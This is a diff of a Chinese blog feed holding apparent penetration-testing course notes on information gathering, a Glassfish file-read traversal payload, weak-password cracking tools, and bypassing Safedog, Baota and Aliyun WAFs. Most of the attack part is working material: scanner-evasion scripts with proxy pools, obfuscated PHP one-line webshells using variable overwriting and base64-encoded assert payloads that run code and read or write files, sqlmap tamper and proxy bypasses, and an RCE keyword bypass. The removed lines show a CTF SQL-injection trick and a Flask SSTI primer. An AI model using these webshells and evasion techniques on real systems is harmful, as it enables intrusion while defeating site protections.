+思路2：当我们拿到一个域名时，通过查看它的whois信息、下方版权信息等获取到该网站特有的一些关键信息，然后直接百度搜索这些信息，就有可能得到一些与该网站相关的其他域名。</p>
+<p><strong>案例3：其他补充类-基于IP配合端口又测试</strong></p>
+<p>思路1：假设xx.com对应目录d:/wwwroot/xx/，192.168.33.2对应目录d:/wwwroot/，此时目录d:/wwwroot/下有一个网站备份压缩包xx.zip，那么访问xx.com/xx.zip不能下载，但是访问192.168.33.2/xx.zip可以成功下载。</p>
+<p>思路2：给定一个域名，我们先找到对应的ip，然后扫描IP，可以发现开放的端口，我们进行目录扫描或敏感文件扫描时，不仅需要对域名扫描，还要对IP以及IP:端口进行扫描，这样会发现更多的漏洞。</p>
+<p><strong>案例4：端口服务类-Tomcat弱口令安全问题</strong></p>
+<p>1.使用Vulhub一键搭建漏洞测试靶场（https://vulhub.org/）</p>
+<p>docker-compose 启动报错时，试试命令：sudo docker-compose up -d</p>
+<p>参考：http://wxnacy.com/2019/01/23/docker-compose-up-error/</p>
+<p>2.在Vulhub网站搜索tomcat弱口令漏洞洞，按照步骤，启动环境，漏洞复现。如图<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636194555789.png" alt="" loading="lazy"><br>
+<strong>案例5：端口服务类-Glassfish任意文件读取</strong></p>
+<pre><code>访问https://192.168.28.128:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd，返回服务器文件。
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636194559564.png" alt="" loading="lazy"><br>
+<strong>案例6：口令安全脚本工具简要使用-Snetcarcker</strong><br>
+Snetcarcker下载：https://github.com/shack2/SNETCracker/releases<br>
+SNETCracker超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<br>
+工具采用C#开发，需要安装.NET Framework 4.0，工具目前支持SSH、RDP、SMB、MySQL、SQLServer、Oracle、FTP、MongoDB、Memcached、PostgreSQL、Telnet、SMTP、SMTP_SSL、POP3、POP3_SSL、IMAP、IMAP_SSL、SVN、VNC、Redis等服务的弱口令检查工作。<br>
+工具特点：<br>
+1.支持多种常见服务的口令破解，支持RDP（3389远程桌面）弱口令检查。<br>
+2.支持批量导入IP地址或设置IP段，同时进行多个服务的弱口令检查。<br>
+3.程序自带端口扫描功能，可以不借助第三方端口扫描工具进行检查。<br>
+4.支持自定义检查的口令，自定义端口。<br>
+其他工具：hydra</p>
+<p><strong>案例7：API接口类-网络服务类探针利用测试-AWVS</strong><br>
+测试WSDL网络服务可使用AWVS扫描<br>
+awvs下载：https://www.cnblogs.com/xyongsec/p/12370488.html<br>
+小技巧：sqlmap指定在参数id处进行注入：使id=1*</p>
+<h1 id="2021-11-5-小迪渗透waf绕过">2021-11-5 小迪渗透&amp;Waf绕过</h1>
+<h1 id="46信息收集之反爬虫延迟代理技术46-49">46.信息收集之反爬虫延迟代理技术(46-49)</h1>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636093502407.png" alt="" loading="lazy"><br>
+<strong>网站部署waf时，采用进程抓包工具抓取webpathbrute数据包分析，一般有2种结果：</strong></p>
+<p>1.直接误报或者无结果<br>
+2.扫描一段时间后突然误报<br>
+扫描探针机制</p>
+<p>数据包拦截<br>
+速度过快拦截<br>
+WebPathBrute-Web路径暴力探测工具：https://github.com/7kbstorm/7kbscan-WebPathBrute</p>
+<p>使用WebPathBrute扫描网站目录，当网站服务器分别部署了以下waf时，对拦截机制进行测试分析，结果如下：</p>
+<p><strong>1.safedog-默认拦截机制-未开CC</strong></p>
+<p>扫描结果：出现误报，全部200状态码<br>
+原因：浏览器采用get方法，工具扫描采用head方法。<br>
+绕过方法：更改提交方式（改为get方法）或模拟用户<br>
+<strong>2.safedog-默认拦截机制-开启CC</strong></p>
+<p>扫描结果：误报<br>
+绕过方法：延时或代理池或爬虫引擎。<br>
+<strong>2.1 延时</strong><br>
+可开启延时扫描，慢速扫描，缺点是速度过慢。<br>
+<strong>2.2 代理池</strong><br>
+网上搜索代理池，写python脚本，添加代理池。确定是WAF可能开启了防代理，无法绕过。<br>
+<strong>2.3 爬虫引擎</strong><br>
+可在软件中自定义添加爬虫引擎头部（但是扫描不出现结果）<br>
+各大搜索引擎的User-Agent：https://www.cnblogs.com/iack/p/3557371.html<br>
+<strong>3.Aliyun_os-默认拦截机制</strong></p>
+<p>扫描结果：对部署在阿里云上的网站进行目录扫描时，扫着扫着网站就打不开了，大约1个小时后才能重新打开，重启服务器也不能使网站重新打开，只能等一个小时，猜测这是因为阿里云自己有一套防护体系。<br>
+绕过方法：无法模拟搜索引擎爬虫绕过，只能采用延时或代理池<br>
+<strong>4.BT（防火墙插件）-默认拦截机制</strong></p>
+<p><strong>拦截机制举例：</strong><br>
+60秒内，请求同一URL超过120次，封锁IP 100秒。<br>
+60秒内，恶意请求6次，封IP 600秒。<br>
+什么是恶意请求？比如宝塔检测到用户频繁请求index.php.bak等备份文件，即判断为恶意请求，拦截。对于这种拦截，绕过方法为字典重写（参考于upload-labs做字典）<br>
+绕过方法：爬虫未知，延时可以，代理池可以<br>
+5.阿里云（免费）+ safedog + 宝塔（付费插件）</p>
+<p>绕过方法：延时或代理池<br>
+6.python编写绕过脚本，进行目录扫描</p>
+<p>自定义headers头部，模拟用户<br>
+休眠3秒，模拟延时（测试发现，阿里云至少休眠3秒，否则拦截）<br>
+添加proxy，从网上爬取代理池，按需添加，比如一个代理发10个请求，接着换另一个代理。<br>
+脚本如下<br>
+#搜索引擎爬虫模拟及模拟真实用户</p>
+<pre><code>import requests
+import time
+
+headers={
+'Connection': 'keep-alive',
+'Cache-Control': 'max-age=0',
+'Upgrade-Insecure-Requests': '1',
+#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)
+#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html
+'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider-render/2.0;+http://www.baidu.com/search/spider.html)',
+'Sec-Fetch-Dest': 'document',
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'Sec-Fetch-Site': 'none',
+'Sec-Fetch-Mode': 'navigate',
+'Sec-Fetch-User': '?1',
+'Accept-Encoding': 'gzip, deflate, br',
+'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+'Cookie': 'PHPSESSID=99d6a382f03de62bb8f51ba51e51550f',#根据当前访问 cookie
+}
+
+for paths in open('php_b.txt',encoding='utf-8'):
+url='http://192.168.0.109:8890/'
+paths=paths.replace('\n','')
+urls=url+paths
+#如需测试加代理，或加入代理池需加代理
+proxy = {
+'http': '127.0.0.1:7777'
+}
+try:
+code=requests.get(urls,headers=headers,verify=False).status_code
+print(urls+'|'+str(code))
+if code==200 or code==403:
+print(urls+'|'+str(code))
+except Exception as err:
+print('connecting error')
+#time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度
+</code></pre>
+<p>涉及资源<br>
+https://www.bt.cn/<br>
+http://free.safedog.cn/website_safedog.html<br>
+https://www.cnblogs.com/iack/p/3557371.html</p>
+<p><strong>47.W漏洞发现之代理池指纹被动探针</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636093509448.png" alt="" loading="lazy"><br>
+<strong>47.1 漏洞发现触发 WAF 点-针对 xray,awvs 等</strong><br>
+1.扫描速度-(代理池，延迟，白名单等)<br>
+2.工具指纹-(特征修改，伪造模拟真实用户等)<br>
+3.漏洞 Payload-(数据变异，数据加密，白名单等)</p>
+<p><strong>47.2 案例演示</strong><br>
+代理池 Proxy_pool 项目搭建及使用解释</p>
+<p><strong>案例1：代理池Proxy_pool项目搭建及使用解释</strong></p>
+<p>Proxy_pool免费，但是不适用于waf绕过，因为它是抓取网上各种代理平台提供的免费代理，免费代理存活时间短，成功率随机，稳定性差。</p>
+<p>1.Proxy_pool下载（地址：https://github.com/jhao104/proxy_pool），安装库文件，修改setting.py文件</p>
+<pre><code>HOST = &quot;127.0.0.1&quot;
+
+DB_CONN = 'redis://:@127.0.0.1:6379/0'
+</code></pre>
+<p>2.下载并安装Redis-x64-3.2.100.msi，地址：https://github.com/MicrosoftArchive/redis/releases。</p>
+<p>安装完成后，启动服务（找到安装路径，双击redis-cli.exe文件即可，或者在计算机管理-服务 处启动）</p>
+<p>3.Redis可视化工具Redis Desktop Manager下载（http://pan.baidu.com/s/1kU8sY3P），安装，连接。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636094164164.jpg" alt="" loading="lazy"><br>
+4.启动调度程序即可抓到代理，命令：python proxyPool.py schedule<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636094168888.jpg" alt="" loading="lazy"></p>
+<p>5.启动webApi服务即可通过web api查看代理。</p>
+<p>启动命令：python proxyPool.py server</p>
+<p>查看：http://127.0.0.1:5010/get/<br>
+Redis Desktop Manager中查看<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636094175121.png" alt="" loading="lazy"></p>
+<p><strong>充钱代理池直接干 safedog+BT+Aliyun 探针</strong></p>
+<p>免费代理不好用，那我们就买代理，建议选择隧道代理，每次请求换IP。<br>
+快代理：https://www.kuaidaili.com/</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636094179586.jpg" alt="" loading="lazy"><br>
+使用上次的脚本，配置收费代理。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636094184041.jpg" alt="" loading="lazy"></p>
+<p><strong>Safedog-awvs 漏扫注入测试绕过-延时,白名单</strong></p>
+<p>使用网站：【http://httpbin.org/ip】检测访问其他网站的原始ip是哪个</p>
+<p>awvs扫描sqli-labs（绕过安全狗），设置最低速或者修改AWVS指纹头</p>
+<figure data-type="image" tabindex="121"><img src="https://jinqipiaopiao.github.io//post-images/1636094189769.jpg" alt="" loading="lazy"></figure>
+<p><strong>Aliyun_os-awvs 漏扫注入测试绕过-延时白名单</strong></p>
+<p>注意：不是每个工具都可以控制扫描速度和改变指纹头，比如xray貌似就不行。</p>
+<p>此时，可以对工具使用代理，将数据包发送到burpsuite上，人为的对每个数据包点击放行（太麻烦了吧），以控制速度。也可以自己写个鼠标点击器，代替人为点击。</p>
+<p>对于漏洞payload触发WAF这种情况，我们怎么绕过呢？</p>
+<p>我们举个例子，由于每个工具判断注入点的方式不同，假设awvs通过and 1=1判断注入，xray通过or 1=1判断注入，那么当waf对and 1=1进行拦截时，我们就不能使用awvs来扫描了，因为扫描不出结果，但是我们可以换xray扫描，这样就绕过了waf拦截，所以实际操作时，我们可以多换几个工具进行扫描。（方法1）</p>
+<p>此外还可以使用冷门扫描工具，因为工具冷门，所以漏洞验证和指纹都不会被WAF采集到，可以绕过。（方法2）</p>
+<p>使用开源的或者自己编写的工具扫描时，可以针对触发WAF点进行数据变异，从而绕过拦截。（方法3）</p>
+<p><strong>BT(baota)-awvs+xray 漏扫 Payload 绕过-延时被动</strong></p>
+<p>awvs扫描，配置代理，将数据包发送到burp，burp配置代理，将数据包发送给xray，实现三者联动。</p>
+<p>此时如果awvs控制了扫描速度，那么xray也会被动延时。</p>
+<figure data-type="image" tabindex="122"><img src="https://jinqipiaopiao.github.io//post-images/1636094201396.jpg" alt="" loading="lazy"></figure>
+<p><strong>充钱代理池直接干 Safedog+BT+AliyunOS 漏洞发现</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636094208016.jpg" alt="" loading="lazy"></p>
+<p>涉及资源<br>
+http://httpbin.org/<br>
+https://www.kuaidaili.com/<br>
+https://github.com/jhao104/proxy_pool</p>
+<p><strong>48.权限控制之代码混淆及行为造轮子</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636093522129.png" alt="" loading="lazy"><br>
+<strong>48.1 Safedog&amp;宝塔代码层手写及脚本绕过</strong><br>
+变量覆盖，加密混淆，异或生成<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636093533648.png" alt="" loading="lazy"></p>
+<pre><code>127.0.0.1:8081/1.php?x=b;y=assert post:z=phpinfo 这种传输形式宝塔会拦截
+</code></pre>
+<figure data-type="image" tabindex="123"><img src="https://jinqipiaopiao.github.io//post-images/1636093528736.png" alt="" loading="lazy"></figure>
+<p>在脚本里把接收的参数加密可绕过，把phpinfo()采用base64加密形式传输</p>
+<pre><code>&lt;?php
+$a=$_GET['x'];
+$$a=$_GET['y'];
+#$b($_POST['z']); 宝塔会拦截
+$b(base64_decode($_POST['z']));
+?&gt;
+
+http://192.168.206.132:8082/`1.php?x=b&amp;y=assert`
+#z=phpinfo();
+z=cGhwaW5mbygpOw==
+//传参：?x=b&amp;y=assert
+//$a=b  $$a=assert=$b assert($_POST['z']);
+
+可以绕过safedog查杀
+
+上传成功后，
+访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
+并且(可以用hackbar插件)postdata:z=phpinfo();
+
+safedog不拦截
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636093544651.png" alt="" loading="lazy"><br>
+异或生成<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636093553086.png" alt="" loading="lazy"></p>
+<p><strong>48.2 BT Aliyun 代码层手写及脚本绕过</strong><br>
+编码解码(变量覆盖，加密混淆，异或生成)ASP,PHP,ASPX,JSP,PY 等后门免杀同理</p>
+<pre><code>http://test.xiaodi8.com/x.php?id=x
+mr6=cGhwaW5mbygpOw==
+http://test.xiaodi8.com/xx.php?x=b&amp;y=assert
+z=cGhwaW5mbygpOw== 执行代码
+z=ZmlsZV9wdXRfY29udGVudHMoInRlc3QudHh0IiwiMSIpOw== 写入文件
+z=dmFyX2R1bXAoc2NhbmRpcigiLiIpKTs= 读取文件
+</code></pre>
+<p><strong>48.3 菜刀，蚁剑，冰蝎优缺点</strong><br>
+菜刀：未更新状态，无插件，单向加密传输<br>
+蚁剑：更新状态，有插件，拓展性强，单向加密传输<br>
+冰蝎：更新状态，未知插件，双向加密传输<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636093558580.png" alt="" loading="lazy"><br>
+演示案例：<br>
+<strong>Safedog-手写覆盖变异简易代码绕过-代码层</strong></p>
+<pre><code>一句话木马：&lt;?php assert($_POST['chopper']);?&gt;
+</code></pre>
+<p>变量覆盖：通过把敏感字符写到参数上，绕过WAF：</p>
+<pre><code>&lt;?php
+$a=$_GET['x'];
+$$a=$_GET['y'];
+$b($_POST['z']);
+?&gt;
+
+//传参：?x=b&amp;y=assert
+//$a=b  $$a=assert=$b assert($_POST['z']);
+
+可以绕过safedog查杀
+
+上传成功后，
+访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
+并且(可以用hackbar插件)postdata:z=phpinfo();
+
+safedog不拦截
+</code></pre>
+<p>测试，成功。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095006090.jpg" alt="" loading="lazy"></p>
+<p><strong>Safedog-基于接口类加密混淆代码绕过-代码层</strong><br>
+采取上述覆盖变量的方式可以绕过安全狗查杀，但是会被宝塔拦截。原因是 宝塔过滤规则里定义了phpinfo()等关键字<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095010887.png" alt="" loading="lazy"><br>
+所以可以配套 使用编码解码方式 绕过 宝塔。</p>
+<pre><code>一句话木马：&lt;br&gt;&lt;?php
+$a=$_GET['x'];
+$$a=$_GET['y'];
+$b(base64_decode($_POST['z']));
+?&gt;
+
+上传成功后，
+访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
+并且(可以用hackbar插件)postdata:z=cGhwaW5mbygpOw==
+</code></pre>
+<figure data-type="image" tabindex="124"><img src="https://jinqipiaopiao.github.io//post-images/1636095018940.png" alt="" loading="lazy"></figure>
+<p><strong>BT,Aliyun-基于覆盖加密变异下编码解码绕过-代码层</strong><br>
+上传一句话木马：</p>
+<pre><code>&lt;?php assert(base64_decode($_POST['chopper']));?&gt;
+</code></pre>
+<p>木马文件被安全狗查杀<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095025311.png" alt="" loading="lazy"><br>
+访问被安全狗拦截<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095029627.png" alt="" loading="lazy"><br>
+可以采用加密混淆的方法绕过</p>
+<p><strong>方法1：使用enPHP工具加密混淆代码</strong></p>
+<pre><code>enPHP：一个开源加密混淆 PHP 代码项目
+
+源码地址：https://github.com/djunny/enphp（工具已被删除）
+命令：php.exe code_test.php
+
+在线地址：http://enphp.djunny.com/（貌似也用不了？）
+</code></pre>
+<p>加密混淆后木马：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095035018.png" alt="" loading="lazy"><br>
+测试，成功。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095040092.png" alt="" loading="lazy"><br>
+<strong>方法2：phpjiami在线加密混淆</strong></p>
+<p>地址：https://www.phpjiami.com/phpjiami.html</p>
+<p>木马加密前后对比：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095046111.png" alt="" loading="lazy"><br>
+成功<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095052011.png" alt="" loading="lazy"><br>
+<strong>案例4：safedog,BT,Aliyun-基于覆盖加密变异下编码解码绕过-代码层</strong></p>
+<p>venom：支持生成asp、aspx、jsp、php等一句话免杀木马</p>
+<p>下载：https://pan.baidu.com/s/1msqO2kps139NNP9ZEIAVHw 提取码：xiao<br>
+这个项目原来在github上，后来被移除了。发现gitee上也有Webshell-venom，<br>
+地址：https://gitee.com/Dyan_code/webshell-venom?_from=gitee_search</p>
+<pre><code>## 使用方法
+```
+python3 php_venom_3.3.py    //生成免杀一句话
+    
+python3 php_venom_3.3.py shell.php   //对同目录下shell.php进行免杀处理，结果保存在shell.php.bypass.php
+```
+    
+## 3.x 使用说明：
+
+是否传入id参数决定是否把流量编码
+
+```
+http://www.xxx.com/shell.php 
+POST: mr6=phpinfo();  //与普通shell相同
+
+http://www.xxx.com/shell.php?id=xxx(xxxx随便修改)
+POST: mr6=cGhwaW5mbygpOwo=  //payload的base64编码
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636095059217.png" alt="" loading="lazy"><br>
+测试，成功。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095065591.png" alt="" loading="lazy"></p>
+<p><strong>Safedog,BT,Aliyun-基于冰蝎新型控制器绕过全面测试-行为层</strong></p>
+<p>3个工具比较：</p>
+<p>菜刀：已经不再更新了，无插件（看举例1），单向加密传输，打5分，不建议使用。<br>
+蚁剑：持续更新状态，有插件，扩展性强，缺点是单向加密传输，打8分。<br>
+冰蝎：持续更新状态，未知插件，扩展性强，双向加密传输，偏向于后渗透，可以联动msf.，打分9分，推荐使用。<br>
+下载地址：</p>
+<p>冰蝎：https://github.com/rebeyond/Behinder/releases/<br>
+蚁剑：https://github.com/AntSwordProject/antSword/releases</p>
+<p>举例1：菜刀工具没有base64编码解码功能，所以就无法通过编码绕过宝塔，但是蚁剑可以，如下图所示。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095070501.png" alt="" loading="lazy"></p>
+<p>单向加密传输VS双向加密传输：</p>
+<p>单向加密传输：请求参数加密，响应不加密。<br>
+双向加密传输：请求加密，响应加密，更好地保护数据传输，防止waf拦截被杀。<br>
+冰蝎双向加密传输原理：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095076348.png" alt="" loading="lazy"></p>
+<p>冰蝎-双向加密传输-抓包查看<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095082043.png" alt="" loading="lazy"></p>
+<p><strong>Safedog,BT,Aliyun-基于手写新型控制器绕过全面测试-行为层</strong><br>
+使用工具连接木马时，waf可能会通过工具的指纹实现拦截，此时我们可以采用如下方法绕过：1、指纹变异、2、自己造轮子</p>
+<p>举例如下，自己写脚本模拟工具</p>
+<pre><code>http://test.xxx.com/xx.php?x=b&amp;y=assert
+post data举例：
+执行代码 z=phpinfo(); --&gt;  z=cGhwaW5mbygpOw==
+写入文件 z=file_put_contents(&quot;test.txt&quot;,&quot;1&quot;); --&gt;  z=ZmlsZV9wdXRfY29udGVudHMoInRlc3QudHh0IiwiMSIpOw==
+读取文件 z=var_dump(scandir(&quot;.&quot;)); --&gt;  z=dmFyX2R1bXAoc2NhbmRpcigiLiIpKTs=
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636095089441.png" alt="" loading="lazy"><br>
+测试，成功。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095096194.png" alt="" loading="lazy"><br>
+涉及其他资源：</p>
+<p>1、wsexplorer抓包工具<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095101787.png" alt="" loading="lazy"></p>
+<p>2、超级加解密转换工具<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095106138.png" alt="" loading="lazy"></p>
+<p>涉及资源<br>
+https://github.com/djunny/enphp<br>
+https://www.phpjiami.com/phpjiami.html<br>
+https://github.com/rebeyond/Behinder/releases/<br>
+https://github.com/AntSwordProject/antSword/releases</p>
+<p><strong>49.漏洞利用注入上传跨站等绕过</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636093563436.png" alt="" loading="lazy"><br>
+** 49.1 SQL 注入**<br>
+如需 sqlmap 注入 修改 us 头及加入代理防 CC 拦截自写 tamper 模块<br>
+安全狗：参考之前 payload<br>
+Aliyun：基本修改指纹即可<br>
+宝塔：匹配关键字外加/*等<br>
+如需sqlmap注入测试，</p>
+<p>防cc拦截：修改user-agent头+代理（付费代理池）<br>
+修改user-agent头：<br>
+（1）加参数：--random-agent<br>
+（2）加参数：--user-agent=&quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;<br>
+各大搜索引擎的User-Agent：https://www.cnblogs.com/iack/p/3557371.html<br>
+（3）修改配置文件sqlmap.conf中的agent变量值<br>
+加代理：--proxy=&quot;http:tps123.kdlapi.com:15818&quot;<br>
+绕过安全狗：自写tamper模块，参考如下waf-dog.py<br>
+绕过Aliyun：基本修改指纹即可（修改user-agent头）<br>
+绕过宝塔：匹配关键字外加/*等</p>
+<figure data-type="image" tabindex="125"><img src="https://jinqipiaopiao.github.io//post-images/1636093568217.png" alt="" loading="lazy"></figure>
+<pre><code>python sqlmap.py -u &quot;http://test.xiaodi8.com/sqlilabs/Less-2/?id=1&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent
+</code></pre>
+<p>waf-dog.py：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095492228.jpg" alt="" loading="lazy"><br>
+在买了宝塔付费产品后，过狗的payload中含有/*的都会被宝塔拦截。</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636095483018.png" alt="" loading="lazy"><br>
+可以使用%00截断来绕过。</p>
+<p>修改脚本，在使用/*的时候在前面加上%00<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095476384.png" alt="" loading="lazy"><br>
+另外，抓包查看sqlmap的指纹如下，会被waf拦截，所以需要修改us头。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1636095468936.png" alt="" loading="lazy"></p>
+<p><strong>49.2 文件上传</strong><br>
+1.php 截断 参考前面上传 waf 绕过 payload</p>
+<p><strong>49.3 XSS 跨站</strong><br>
+利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc</p>
+<p><strong>49.4 其他集合</strong><br>
+RCE<br>
+加密加码绕过？算法可逆？关键字绕过？提交方法？各种测试！</p>
+<pre><code>txt=$y=str_replace('x','','pxhpxinxfo()');assert($y);&amp;submit=%E6%8F%90%E4%BA%A4
+
+文件包含：没什么好说的就这几种
+…\ …/ …\
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1636095460893.jpg" alt="" loading="lazy"><br>
+————————————————<br>
+版权声明：本文为CSDN博主「进击的网安攻城狮」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_41665162/article/details/119827651</p>
 ]]></content>
     </entry>
     <entry>
@@ -7343,451 +9717,6 @@ https://www.cnblogs.com/tr1ple/p/11156279.html</p>
 ————————————————<br>
 版权声明：本文为CSDN博主「恋物语战场原」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
 原文链接：https://blog.csdn.net/qq_26406447/article/details/100711933</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[利用预编译来SQL注入]]></title>
-        <id>https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/</id>
-        <link href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">
-        </link>
-        <updated>2021-06-05T07:07:44.000Z</updated>
-        <content type="html"><![CDATA[<p>在做CTF时遇到这样一个题目，注入点过滤了SELECT和.还有WHERE等关键词，但是支持多语句查询，这样是可以看到库名列名的，利用如下的方式:</p>
-<pre><code>id=1';show tables;%23
-</code></pre>
-<p>但是没法查询字段，于是就可以利用构建预编译语句来绕过过滤。</p>
-<p>利用此方法的前提是支持多语句查询。</p>
-<p>先来谈谈什么叫预编译，实际上它经常被用来防止SQL注入，介于SQL注入的根本原理是未将数据与代码有效区分开，预编译的目的就在于解决这一点。</p>
-<p>我们常见的有关防止SQL注入的预编译手段都是基于后端代码的，即PHP或Java的PDO，而这次的用法就是使用SQL命令直接预编译语句。</p>
-<p>MySQL的预编译语法为：</p>
-<p>//定义预编译语句</p>
-<pre><code>PREPARE stmt_name FROM preparable_stmt;
-</code></pre>
-<p>//执行预编译语句</p>
-<pre><code>EXECUTE stmt_name [USING @var_name [, @var_name] ...];
-</code></pre>
-<p>解释一下，定义的时候，preparable_stmt代表的是预留数据位置的SQL语句，而stmt_name是类似变量名，代表这个SQL语句，下面举个例子：</p>
-<pre><code>PREPARE test FROM 'SELECT (? + ?)';
-</code></pre>
-<p>//即定义了一个两数相加的SQL预编译语句<br>
-执行时，@var_name即变量，可以带入语句中进行执行，如：</p>
-<pre><code>SET @a = 1;
-SET @b = 2; //给变量赋值
-
-EXECUTE test USING @a,@b;//执行
-</code></pre>
-<p>这道题目主要就是利用此方法来绕过黑名单，其具体方法也不止一种，可以利用concat()将关键词分开处理，也可以将整个语句使用char()处理后执行。<br>
-原文地址为：https://eviladan0s.github.io/2020/03/08/sql_trick/</p>
-<p>未经授权禁止转载<br>
-作者：白袍大人<br>
-https://www.bilibili.com/read/cv5071554/<br>
-出处： bilibili</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Python-模板注入]]></title>
-        <id>https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/</id>
-        <link href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">
-        </link>
-        <updated>2021-06-04T02:15:31.000Z</updated>
-        <content type="html"><![CDATA[<p>何为模板注入？<br>
-模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，哲大大提升了开发效率，良好的设计也是的代码重用变得更加容易。<br>
-到那时模板引擎也拓宽了我们的攻击面，注入到模板中的代码可能会引发RCE或者XSS<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622774211791.png" alt="" loading="lazy"><br>
-flask基础<br>
-在学习SSTI之前，先把flask的运作流程搞明白，这样有利于更加快速的理解原理<br>
-路由<br>
-先看一段代码</p>
-<pre><code>from flask import flask
-
-@app.route('/index/')
-def hello_word():
-return 'hello world'
-</code></pre>
-<p>route装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问http:127.0.0.1：5000/index的时候，flask会返回hello world<br>
-渲染方法<br>
-flask的渲染方法有render_template和render_template_string两种。<br>
-render_template()是用来渲染一个指定文件的。使用如下</p>
-<pre><code>return render_template('indexhtml')
-</code></pre>
-<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分<br>
-使用方法如下</p>
-<pre><code>html='&lt;h1&gt;This is index page&lt;/h1&gt;'
-return render_template_string(html)
-</code></pre>
-<p>模板<br>
-flask时使用Jinja2来作为渲染引擎的。看例子<br>
-在网站的根目录下新建templates文件夹，这里是用来存放html文件。也就是模板文件。</p>
-<p>test.py</p>
-<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
-@app.route('/index/')
-def user_login():
-return render_template('index.html')
-</code></pre>
-<p>/templates/index.html</p>
-<pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;
-</code></pre>
-<p>访问127.0.0.1:5000/index/的时候，flask就会渲染出index.html的页面。</p>
-<p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
-<p>例子</p>
-<p>test.py</p>
-<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
-@app.route('/index/')
-def user_login():
-return render_template('index.html',content='This is index page.')
-
-/templates/index.html
-
-&lt;h1&gt;{{content}}&lt;/h1&gt;
-</code></pre>
-<p>这个时候页面仍然输出This is index page。</p>
-<p><code>{{}}</code>在Jinja2中作为变量包裹标识符。<br>
-模板注入</p>
-<p>不正确的使用flask中的render_template_string方法会引发SSTI。那么是什么不正确的代码呢？<br>
-xss利用</p>
-<p>存在漏洞的代码</p>
-<pre><code>@app.route('/test/')
-def test():
-code = request.args.get('id')
-html = '''
